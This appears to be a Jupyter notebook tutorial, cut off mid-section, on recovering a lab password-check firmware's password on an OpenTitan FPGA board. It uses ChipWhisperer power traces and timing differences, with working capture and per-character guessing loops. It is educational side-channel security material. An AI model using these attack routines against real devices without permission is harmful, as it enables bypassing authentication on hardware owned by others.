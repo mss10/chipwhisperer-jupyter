{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Timing Analysis with Power for Password Bypass\n",
    "\n",
    "Supported setups:\n",
    "\n",
    "SCOPES:\n",
    "\n",
    "* OPENADC\n",
    "* CWNANO\n",
    "\n",
    "PLATFORMS:\n",
    "\n",
    "* CWLITEARM\n",
    "* CWLITEXMEGA\n",
    "* CWNANO"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This tutorial will introduce you to breaking devices by determining when a device is performing certain operations. It will use a simple password check, and demonstrate how to perform a basic power analysis.\n",
    "\n",
    "Note this is not a prerequisite to the tutorial on breaking AES. You can skip this tutorial if you wish to go ahead with the AES tutorial."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'OpenTitan'\n",
    "VERSION = 'HARDWARE'\n",
    "\n",
    "# define the length of the password to guess\n",
    "PW_LEN = 5\n",
    "\n",
    "# Clock Frequency\n",
    "FREQUENCY = 20e6 # system clock for OpenTitan "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "# import dependencies\n",
    "import chipwhisperer as cw\n",
    "from tqdm import tqdm, tnrange\n",
    "import numpy as np\n",
    "import time\n",
    "import sys\n",
    "import os\n",
    "\n",
    "# Serial communication\n",
    "import serial\n",
    "encoding = 'utf-8'\n",
    "# Plotting\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "# Subprocess\n",
    "import subprocess\n",
    "from subprocess import Popen, PIPE, check_output\n",
    "\n",
    "from pathlib import Path\n",
    "\n",
    "# import color definition\n",
    "from OpenTitan.Definitions.mColors import mColors"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Firmware"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Like before, we'll need to setup our `PLATFORM`, then build the firmware:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if PLATFORM == \"OpenTitan\":\n",
    "    # define project directory\n",
    "    HOME = str(Path.home())\n",
    "    OPENTITAN_DIR = HOME + '/Work/backup_20MHz/opentitan' # '/opentitan/'\n",
    "else:\n",
    "    print(\"Please start the tutorial from beginning...\\n\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let us define some functions to build the project and to flash software to the target:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def build_software():\n",
    "    CMD = \"ninja -C build-out sw/device/examples/basic_passwdcheck/basic_passwdcheck_export_fpga_artys7\"\n",
    "    try:\n",
    "        p = subprocess.check_output(CMD, cwd=OPENTITAN_DIR, stderr=subprocess.STDOUT, shell=True, timeout=30)\n",
    "        return 0\n",
    "    except subprocess.TimeoutExpired as result:                                                                                                   \n",
    "        print(mColors.CBLACK + \"\"\"build process timed out. Retry it.\"\"\" + mColors.ENDC)\n",
    "        return 1\n",
    "    except subprocess.CalledProcessError as e:\n",
    "        print(mColors.CBLACK + mColors.CORG + \"command '{}' \\nreturn with error (code {}):\\n {}\".format(e.cmd, e.returncode, e.output) + mColors.ENDC)\n",
    "        if (\"error\") in str(e.output):\n",
    "            print(mColors.CBLACK + mColors.CORG + \"Please run 'meson -f' and check the build process\" + mColors.ENDC)\n",
    "        return 1\n",
    "\n",
    "def flash_software():\n",
    "    CMD = \"build-bin/sw/host/spiflash/spiflash --input build-bin/sw/device/examples/basic_passwdcheck/basic_passwdcheck_fpga_artys7.bin\"\n",
    "    try:\n",
    "        p = subprocess.check_output(CMD, cwd=OPENTITAN_DIR, stderr=subprocess.STDOUT, shell=True, timeout=30)\n",
    "        return 0\n",
    "    except subprocess.TimeoutExpired as result:                                                                                                   \n",
    "        print(mColors.CBLACK + mColors.CORG + \"\"\"flash process timed out. Retry it.\"\"\" + mColors.ENDC)\n",
    "        return 1\n",
    "    except subprocess.CalledProcessError as e:\n",
    "        print(CSTYLE + CBLACK + \"command '{}' \\nreturn with error (code {}):\\n {}\".format(e.cmd, e.returncode, e.output) + mColors.ENDC)\n",
    "        if (\"Unable to open FTDI SPI interface.\") in str(e.output):\n",
    "            print(mColors.CBLACK + mColors.CORG + \"Please try to replug the FTDI interface\" + mColors.ENDC)\n",
    "        return 1\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# run build_software once you want to change the password on target\n",
    "err = build_software()\n",
    "if err:\n",
    "    print(\"Please check your ninja build process.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Setup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Setup is the same as usual, except this time we'll be capturing 2000 traces."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "# Connect to scope\n",
    "%run \"Setup_Scripts/Setup_OpenTitan.ipynb\"\n",
    "    \n",
    "# Define outging Clock frequency for OpenTitan\n",
    "scope.clock.clkgen_freq = FREQUENCY\n",
    "print(\"CLKGEN target frequency = \" + str(scope.clock.clkgen_freq/1e6) + \" MHz\")\n",
    "print(\"\")\n",
    "time.sleep(0.01)\n",
    "# Reset Target\n",
    "reset_target(scope)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Connect to serial by detecting Arty S7 development board\n",
    "reset_target(scope)\n",
    "connectSerial(target, 230400)\n",
    "time.sleep(0.01)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Flash SW\n",
    "err = flash_software()\n",
    "if err:\n",
    "    print(mColors.CBLACK + mColors.CORG + \"An error occured during flash process, verify bitstream is programmed and replug FTDI interface\" + mColors.ENDC)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Communicating With The Target"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As was mentioned at the beginning of the tutorial, the firmware we loaded onto the target implements a basic password check. After getting a `'\\n'` terminated password, the target checks it and enters an infinite loop, so before communicating with it, we'll need to reset it.\n",
    "\n",
    "We'll be doing this a lot, so we'll define a function that resets the target (this function is also available by running \"Setup_Scripts/Setup.ipynb\" as we did above):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": [
     0
    ]
   },
   "outputs": [],
   "source": [
    "def reset_target(scope):\n",
    "    # Reset pin in OpenTitan layout has to be connected to pdic pin of ChipWhisperer \n",
    "    if PLATFORM == \"CW303\" or PLATFORM == \"CWLITEXMEGA\":\n",
    "        scope.io.pdic = 'low'\n",
    "        time.sleep(0.1)\n",
    "        scope.io.pdic = 'high_z' #XMEGA doesn't like pdic driven high\n",
    "        time.sleep(0.1)\n",
    "    # Reset pin in OpenTitan layout has to be connected to pdic pin of ChipWhisperer \n",
    "    if PLATFORM == \"OpenTitan\":\n",
    "        scope.io.pdic = 'low'\n",
    "        time.sleep(0.05)\n",
    "        scope.io.pdic = 'high'\n",
    "        time.sleep(0.05)\n",
    "    else:  \n",
    "        scope.io.nrst = 'low'\n",
    "        time.sleep(0.05)\n",
    "        scope.io.nrst = 'high'\n",
    "        time.sleep(0.05)\n",
    "        \n",
    "    #Flush garbage too\n",
    "    target.flush()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The target sends some text to us upon starting. After running the block below, you should see some text appear. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Make sure outging Clock for OpenTitan is provided\n",
    "scope.clock.clkgen_freq = FREQUENCY\n",
    "print(\"CLKGEN target frequency = \" + str(scope.clock.clkgen_freq/1e6) + \" MHz\\n\")\n",
    "print(\"\")\n",
    "time.sleep(0.05)\n",
    "\n",
    "\n",
    "result = \"\"\n",
    "ret = bytearray()\n",
    "reset_target(scope)\n",
    "target.flush()\n",
    "time.sleep(0.05)\n",
    "err = flash_software()\n",
    "target.flush()\n",
    "if err:\n",
    "    print(mColors.CBLACK + mColors.CORG + \"An error occured during flash process, verify bitstream is programmed and replug FTDI interface\" + mColors.ENDC)\n",
    "    \n",
    "time.sleep(0.5) # wait for flash procedure\n",
    "num_char = target.in_waiting()\n",
    "while num_char > 0:\n",
    "    ret += target.read()\n",
    "    time.sleep(0.1)\n",
    "    num_char = target.in_waiting()\n",
    "    \n",
    "if ret:\n",
    "    try:\n",
    "        result = str(ret, encoding, errors='ignore')\n",
    "        result = result.split(\"flash!\", 1)\n",
    "        result = result[1]\n",
    "        print(result)\n",
    "    except:\n",
    "        print(\"Try to excecute it again.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we can send the target a password:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "time.sleep(0.5)\n",
    "target.flush()\n",
    "text = \"h0px3\\n\"\n",
    "time.sleep(0.1)\n",
    "text_enc = text.encode()\n",
    "\n",
    "target.write(text_enc)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And get the response. We sent it the right password (hopx3), so you should see \"Access granted, Welcome!\":"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "time.sleep(1)\n",
    "resp = bytearray()\n",
    "resp += target.read()\n",
    "response = str(resp, encoding, errors='ignore')\n",
    "\n",
    "if response:\n",
    "    print(mColors.CBLACK + mColors.CORG + response + mColors.ENDC)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**tip**\n",
    "\n",
    "In real systems, you may often know one of the passwords, which is sufficient to investigate the password checking routines as we will do. You also normally have an ability to reset passwords to default. While the reset procedure would erase any data you care about, the attacker will be able to use this 'sacrificial' device to learn about possible vulnerabilities. So the assumption that we have access to the password is really just saying we have access to a password, and will use that knowledge to break the system in general."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Recording Traces"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we can communicate with our super-secure system, our next goal is to get a power trace while the target is running. To do this, we'll arm the scope just before we send our password attempt, then record the trace as we've done before."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if PLATFORM == \"CWNANO\":\n",
    "    scope.adc.samples = 800\n",
    "elif PLATFORM == \"OpenTitan\":\n",
    "    scope.adc.samples = 800\n",
    "    scope.gain.db = 20         # default: 45"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "# record traces\n",
    "\n",
    "result = None\n",
    "resp = bytearray()\n",
    "target.flush()\n",
    "reset_target(scope)\n",
    "time.sleep(0.05)\n",
    "err = flash_software()\n",
    "if err:\n",
    "    print(mColors.CBLACK + mColors.CORG + \"An error occured during flash process, verify bitstream is programmed and replug FTDI interface\" + mColors.ENDC)\n",
    "\n",
    "time.sleep(0.5) # wait for flash procedure\n",
    "num_char = target.in_waiting()\n",
    "while num_char > 0:\n",
    "    resp += target.read()\n",
    "    time.sleep(0.1)\n",
    "    num_char = target.in_waiting()\n",
    "    \n",
    "if resp:\n",
    "    try:\n",
    "        result = str(resp, encoding, errors='ignore')\n",
    "        result = result.split(\"flash!\", 1)\n",
    "        result = result[1]\n",
    "        print(result)\n",
    "    except:\n",
    "        print(\"Try to excecute it again.\")\n",
    "\n",
    "\n",
    "target.flush()\n",
    "time.sleep(0.05)\n",
    "scope.arm()\n",
    "result = None\n",
    "resp = bytearray()\n",
    "\n",
    "text = \"h0px3\\n\"\n",
    "text_enc = text.encode()\n",
    "target.write(text_enc)\n",
    "ret = scope.capture()\n",
    "if ret:\n",
    "    print('Timeout happened during acquisition')\n",
    "\n",
    "trace = scope.get_last_trace()\n",
    "\n",
    "time.sleep(0.1)\n",
    "reply = bytearray()\n",
    "response = None\n",
    "num_char = target.in_waiting()\n",
    "while num_char > 0:\n",
    "    reply += target.read()\n",
    "    time.sleep(0.1)\n",
    "    num_char = target.in_waiting()\n",
    "    \n",
    "if reply:\n",
    "    response = str(reply, encoding, errors='ignore')\n",
    "    print(mColors.CORG + response + mColors.ENDC)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we have a trace, we'll plot it:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%matplotlib notebook\n",
    "%matplotlib inline\n",
    "import matplotlib.pylab as plt\n",
    "plt.rcParams['figure.dpi'] = 110\n",
    "\n",
    "plt.grid()\n",
    "plt.plot(trace, 'b')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Plot the trace again using Bokeh. It's useful for zooming in."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from bokeh.plotting import figure, show\n",
    "from bokeh.io import output_notebook\n",
    "from bokeh.models import CrosshairTool\n",
    "\n",
    "output_notebook()\n",
    "p = figure()\n",
    "x_range = range(0, len(trace))\n",
    "p.line(x_range, trace)\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Timing Analysis"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we can capture traces, we can begin planning our attack. First we'll make a function to guess a password and return a power trace, since we'll be repeating those steps a lot:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "def cap_pass_trace(pass_guess):\n",
    "    resp = bytearray()\n",
    "    reset_target(scope)\n",
    "    time.sleep(0.01)\n",
    "    flash_software()\n",
    "    time.sleep(0.1) # wait for flashing/bootloader\n",
    "    \n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        resp += target.read() # num_char, 10\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "        \n",
    "    scope.arm()\n",
    "    target.flush()\n",
    "    time.sleep(0.01)\n",
    "    target.write(pass_guess.encode())\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "\n",
    "    trace = scope.get_last_trace()\n",
    "    \n",
    "    time.sleep(0.25) # a simple wait to watch the LEDs\n",
    "    return trace"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, we'll try two different passwords and see if the power traces differ by length. One guess is incorrect and the other character should be the start of the correct password. When it differs in time, we can guess the full password. If not, we will try all characters unti it differs.\n",
    "We'll then plot both traces on the same figure (with the first in red and the second in blue)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": [],
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "# Compare timing of two traces\n",
    "%matplotlib notebook\n",
    "%matplotlib inline\n",
    "import matplotlib.pylab as plt\n",
    "import matplotlib.patches as patches\n",
    "plt.rcParams['figure.dpi'] = 110\n",
    "\n",
    "# record traces\n",
    "scope.adc.samples = 800\n",
    "scope.clock.adc_src = 'clkgen_x4'\n",
    "scope.clock.reset_adc()\n",
    "\n",
    "# Adjust the Gain in range [-6.5; 55] dB\n",
    "db = 25.0\n",
    "scope.gain.db = int(db)\n",
    "db_str = str(round(scope.gain.db))\n",
    "print(\"scope.gain.db = \" + db_str)\n",
    "\n",
    "text_correct = \"h\\n\"    # character 'h' is in password\n",
    "text_wrong = \"\\x00\\n\"   # \\x00 null byte is not\n",
    "print(\"Capturing trace 1 ...\")\n",
    "trace_correct = cap_pass_trace(text_correct)\n",
    "time.sleep(0.1)\n",
    "print(\"Capturing trace 2 ...\")\n",
    "trace_wrong   = cap_pass_trace(text_wrong)\n",
    "\n",
    "# Basic sanity check\n",
    "assert(len(trace_correct) == scope.adc.samples)\n",
    "print(\"✔️ OK to continue!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import matplotlib.patches as patches\n",
    "count = (get_ipython().execution_count)\n",
    "figure = plt.figure(num=count, figsize=(5, 5), dpi=120)\n",
    "#plt.rcParams['lines.linewidth'] = 1.0\n",
    "ax = figure.add_subplot(111)\n",
    "\n",
    "x_range = range(0, len(trace_correct))\n",
    "plt.grid()\n",
    "ax.plot(x_range, trace_wrong, 'orangered', label=text_wrong)\n",
    "ax.plot(x_range, trace_correct, 'blue', label=text_correct)\n",
    "plt.legend(loc=\"upper right\")\n",
    "rect = patches.Rectangle((50,0.08),450,-0.14,linewidth=1.2, edgecolor='k', fill=False, zorder=3)\n",
    "ax.add_patch(rect)\n",
    "\n",
    "dir_out = HOME + \"/chipwhisperer/traces/\" + str(int(scope.clock.clkgen_freq/1e6)) + \"MHz/basicpwcheck/PiFilter-190uH-20uF-12R/\"\n",
    "if os.path.exists(dir_out):\n",
    "    pass\n",
    "else:\n",
    "    try:\n",
    "        os.mkdir(dir_out)\n",
    "    except OSError as exc:\n",
    "        if exc.errno != errno.EEXIST:\n",
    "            raise\n",
    "        pass\n",
    "\n",
    "\n",
    "filename = dir_out + \"compare_\" + db_str + \"dB_\"\n",
    "import os\n",
    "i = 1\n",
    "while os.path.exists('{}{:02d}.png'.format(filename, i)):\n",
    "    i += 1\n",
    "\n",
    "file = '{}{:02d}.png'.format(filename, i)\n",
    "figure.savefig(file, bbox_inches='tight') # , dpi=1000)\n",
    "print(\"Saved file to %s\" % file)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You should see both traces start and end similarly, but differ elsewhere. If you look closely, you should see that the blue trace looks a lot like the red trace but shifted later in time. We'll use this timing difference to break various passwords!\n",
    "\n",
    "Edit the above block to try different passwords and see how it changes for different lengths and number of correct characters. \n",
    "\n",
    "Go back to the original guesses (`\"\\x00\\n\"` and `\"h\\n\"`) and find some distinct section that get shifted in time. Your target may differ, but in my case, there were some distinct section of about 0.3 at 310 in red and 350 in blue. The plot is interactive, so you can zoom in and move around using the buttons on the right side of the plot. Record their locations, value, and the difference in location (in my case, 0.3 at 312, and 0.31 at 356). \n",
    "\n",
    "Using distinct peaks may not always work. Instead of distinct peaks you can use where the two traces start to diverge. At the beginning the power traces are similar even though the number of characters correct is different. However, there is a point where they start to become significantly different. If you can find this spot you can use this spot to do the timing analysis instead. The difference in location should be the same as when using distinct peaks.\n",
    "\n",
    "An even easier way to see this is to simply plot *every* possible first letter. If there is some sort of timing attack, we should see everything take one path, except for a single outlier. Let's try plotting a few traces this way and hope we get an interesting outlier."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "from bokeh.plotting import figure, show\n",
    "from bokeh.io import output_notebook, reset_output\n",
    "from bokeh.models import CrosshairTool, ColumnDataSource, LabelSet\n",
    "\n",
    "reset_output() # stop opening a new tab\n",
    "output_notebook()\n",
    "\n",
    "p = figure(title=\"Compare passwords. Try to find a distinct section that differs in time.\")\n",
    "\n",
    "x_range = range(0, len(trace_correct))\n",
    "p.line(x_range, trace_wrong, line_color='orangered', legend=text_wrong)\n",
    "p.line(x_range, trace_correct, line_color='blue', legend=text_correct)\n",
    "p.legend.label_text_font_size = '14pt'\n",
    "\n",
    "p.rect([250], [0.125], [275], [0.55], fill_color=None, line_color='black', line_width=2)\n",
    "\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "code_folding": []
   },
   "outputs": [],
   "source": [
    "# Help to find significant peaks that get shifted in time\n",
    "from scipy.signal import find_peaks\n",
    "import numpy as np\n",
    "\n",
    "peaks, properties = find_peaks(-trace_wrong[0:600], prominence=0.19, width=0.1) # distance=50) # prominence=(None, 0.3))\n",
    "x_range = range(0, 600)\n",
    "p = figure(title=\"Find a distinct section that differs in time.\")\n",
    "p.line(x_range, trace_wrong, line_width=2, color='orangered', alpha=0.75)\n",
    "p.circle(peaks, trace_wrong[peaks], size=5, color=\"black\", alpha=0.9)\n",
    "show(p)\n",
    "\n",
    "print(','.join(map(str,peaks)))\n",
    "# calculate the differences between the peaks\n",
    "print((np.diff(peaks)))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "## Attacking a Single Letter"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Now that we've located a distinctive timing difference, we can start building our attack. We'll start with a single letter, since that will quickly give us some feedback on the attack.\n",
    "\n",
    "The plan for the attack is simple: keep guessing letters until we no longer see the distinctive spike in the original location. To do this, we'll create a loop that:\n",
    "\n",
    "* Figures out our next guess\n",
    "* Does the capture and records the trace\n",
    "* Checks if sample 229 is larger than -0.2 (replace with appropriate values)\n",
    "\n",
    "To make things a little easier for later, we'll make a function that will return whether our spike is (guess incorrect) or isn't (guess correct) in the right location:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "def checkpass(trace, i):\n",
    "    if PLATFORM == \"CWNANO\":\n",
    "        #There's a bit of jitter\n",
    "        return (trace[228 + 11*i] < 3 and trace[227 + 11*i] < 0.3)\n",
    "    elif PLATFORM == \"CWLITEARM\" or PLATFORM == \"CW308_STM32F3\":\n",
    "        return trace[233 + 36*i] > -0.25\n",
    "    elif PLATFORM == \"CW303\" or PLATFORM == \"CWLITEXMEGA\":\n",
    "        return trace[85 + 72 * i] > -0.2\n",
    "    elif PLATFORM == \"OpenTitan\":\n",
    "        return trace[342 + 44 * i] > 0.15"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "The below loop finds the first correct character, prints it, then ends. You should see \"Success: h\" after a while."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "guesslist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "password = \"\"\n",
    "with tqdm(total=len(guesslist), file=sys.stdout) as pbar:\n",
    "    for c in guesslist:\n",
    "        pbar.set_description('process ' + mColors.BOLD + c + mColors.ENDC, refresh=True)\n",
    "        pbar.update(1)\n",
    "        next_pass = password + c + \"\\n\"\n",
    "        trace = cap_pass_trace(next_pass)\n",
    "        if checkpass(trace, 0):\n",
    "            print(\"\\n\")\n",
    "            print(\"character guessed: \" + mColors.BOLD + c + mColors.ENDC)\n",
    "            break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Note that you will likely need to change the values in `checkpass`, or simply define your own `checkpass()` function."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "## Attacking the Full Password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Now that we can guess a single character, attacking the rest is easy; we just need to repeat the process in another loop, move the check point (this is the change is location you recorded earlier), and update our guess with the new correct letter.\n",
    "\n",
    "After updating the below script and running it, you should see parts of the password printed out as each letter is found."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "%%time\n",
    "guesslist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "password = \"\"\n",
    "for i in range(PW_LEN):\n",
    "    with tqdm(total=len(guesslist), file=sys.stdout) as pbar:\n",
    "        for c in guesslist:\n",
    "            pbar.set_description('process ' + mColors.BOLD + c + mColors.ENDC, refresh=True)\n",
    "            pbar.update(1)\n",
    "            next_pass = password + c + \"\\n\"\n",
    "            trace = cap_pass_trace(next_pass)\n",
    "            time.sleep(0.01)\n",
    "            success_resp = \"Access granted, Welcome!\"\n",
    "            resp = target.read()\n",
    "            response = str(resp, 'utf-8', errors='ignore')\n",
    "            if \"granted\" in response:\n",
    "                print(\"\\n\")\n",
    "                print(mColors.CORG + \"Access granted: password = \" + mColors.BOLD + next_pass + mColors.ENDC)\n",
    "                break\n",
    "            if checkpass(trace, i):\n",
    "                password += c\n",
    "                print(\"\\n\")\n",
    "                print(\"character guessed now: \" + mColors.BOLD + password + mColors.ENDC)\n",
    "                break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "That's it! You should have successfully cracked a password using the timing attack. Some notes on this method:\n",
    "\n",
    "* The target device has a finite start-up time, which slows down the attack. If you wish, remove some of the `printf()`'s from the target code, recompile and reprogram, and see how quickly you can do this attack.\n",
    "* If there were a lock-out on a wrong password, the system would ignore it, as it resets the target after every attempt."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "## Attack via SAD Match"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "As you've seen, for simple timing attacks like this. However, looking at traces in this way has a number of disadvantages:\n",
    "\n",
    "* If the offset between the correct and incorrect guesses changed, we would have to manually incorporate that into the attack\n",
    "* If the offsets change (say changing the optimization level), we have to find the offsets between the traces again\n",
    "* The attack is fairly finnicky and may require some trial and error \n",
    "\n",
    "Luckily, there's a few ways of finding time offsets between parts of traces that are more reliable and require much less manual work. For this section, we will be focusing on using a Sum of Absolute Difference (SAD) match, which is a method of measuring the difference between two signals to find if a target trace is or isn't shifted in time from a reference trace.\n",
    "\n",
    "The SAD match itself is a simple calculation:\n",
    "\n",
    "$$\\sum_{j=0}^{J}|t_{ref,j}-t_{target,j}|$$\n",
    "\n",
    "Where $t_{ref,j}$ is a single point of the reference trace, $t_{target,j}$ is a single point of the target trace, and $j$ is the point along the trace we're taking the difference at. This is performed along the length of the reference trace, $J$. Put simply, we're subtracting the two traces, taking the absolute value, then adding these absolute differences. If this value is low, the traces are very similar. If the value is high, they're very different. Our strategy will be as follows:\n",
    "\n",
    "* Capture a reference trace and find a unique portion\n",
    "* Guess another character and slide the reference along the trace, calculating the SAD at each offset until we find one below a certain threshold\n",
    "* Repeat this until we find a character with a different offset than the reference - this is the correct character\n",
    "* Repeat with the rest of the characters until we've broken the password\n",
    "\n",
    "First, we'll need to make a function to calculate the offset based on a SAD match, which takes in the reference trace, the target trace, and a threshold to match at. Try to write this function yourself, but if you get stuck, `PA_SPA_1_answers.py` has a working version. For maximum compatability with the tutorial, make this function return `None` if it doesn't find a match."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "#def find_offset_SAD(ref, target_trace, threshold):\n",
    "from OpenTitan.PA_SPA_1_answers import find_offset_SAD"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Let's test our function on some simple lists:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "a = list(range(50))\n",
    "b = [5, 6, 7]\n",
    "offset = find_offset_SAD(b, a, 0.01)\n",
    "assert offset == 5, \"Incorrect offset from SAD function\"\n",
    "\n",
    "b = [8.5, 9, 10]\n",
    "offset = find_offset_SAD(b, a, 1)\n",
    "assert offset == 8, \"Incorrect offset from SAD function with nonzero threshold\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "### Choosing a Reference"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Now that we have a working function to find an offset using a SAD match, let's capture a reference trace, as well as a trace with a correct guess:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "%matplotlib notebook\n",
    "%matplotlib inline\n",
    "import matplotlib.pyplot as plt\n",
    "import matplotlib.patches as patches\n",
    "plt.rcParams['figure.dpi'] = 130\n",
    "\n",
    "# Adjustable Gain [-6.5; 55] dB\n",
    "db = -10\n",
    "scope.gain.db = int(abs(db))\n",
    "db_str = str(round(scope.gain.db))\n",
    "print(\"scope.gain.db = \" + db_str)\n",
    "\n",
    "###########################################\n",
    "text_ref = \"a\\n\" # \"\\x00\\n\"\n",
    "ref_trace = cap_pass_trace(text_ref)\n",
    "text_ref_cor = \"h\\n\"\n",
    "ref_correct = cap_pass_trace(text_ref_cor)\n",
    "###########################################\n",
    "\n",
    "# Create figure and axes\n",
    "figure = plt.figure()\n",
    "ax = figure.add_subplot(111)\n",
    "plt.grid(zorder=1)\n",
    "ax.plot(ref_trace, c='orangered', label=text_ref, zorder=2)\n",
    "ax.plot(ref_correct, c='blue', label=text_ref_cor, zorder=2) # - 0.15\n",
    "\n",
    "plt.legend(loc=\"upper right\")\n",
    "plt.xlabel('Samples')\n",
    "\n",
    "rect = patches.Rectangle((100,0.4),300,-0.55,linewidth=1.25,edgecolor='k', fill=False, zorder=3)\n",
    "ax.add_patch(rect) "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "We've got two requirements for the reference: \n",
    "\n",
    "1. It should be fairly unique. For example, the section you select shouldn't match any later section in the same trace\n",
    "2. It must be a portion that shifts in time. For example, the very beginning of the power trace probably doesn't shift in time here, but later sections definitely should.\n",
    "\n",
